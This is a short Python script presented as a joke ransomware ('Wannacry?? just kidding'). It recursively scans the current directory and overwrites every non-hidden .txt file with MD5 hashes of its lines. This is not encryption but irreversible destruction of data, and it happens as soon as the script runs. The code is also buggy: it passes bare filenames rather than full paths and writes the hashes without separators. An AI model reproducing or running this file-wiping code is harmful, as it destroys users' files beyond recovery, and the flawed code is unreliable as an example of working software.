import hashlib as hs
import os
def encrypt(filename):
	print("statring encryption")
	print("getting file data")
	print("got file data")
	f1 = open(filename, "r", encoding='utf-8')
	datas = []
	for line in f1.readlines():
		print(line.encode('utf-8'))
		y =  hs.md5(line.encode('utf-8')).hexdigest()
		datas.append(y)

	f1.close()
	f2 = open(filename, "w")
	for i in datas:
		print(i)
		f2.write(i)
	print("Boom.... Done! Wannacry?? just kidding")

def scanningDir(path):
	allFiles = os.listdir(path)
	for file in allFiles:
		filePath = os.path.join(path, file)
		if os.path.isdir(filePath):
			scanningDir(filePath)
		elif os.path.isfile(filePath):
			if file.startswith("."):
				continue
			if file.endswith(".txt"):
				print(file)
				encrypt(file)
scanningDir(".")
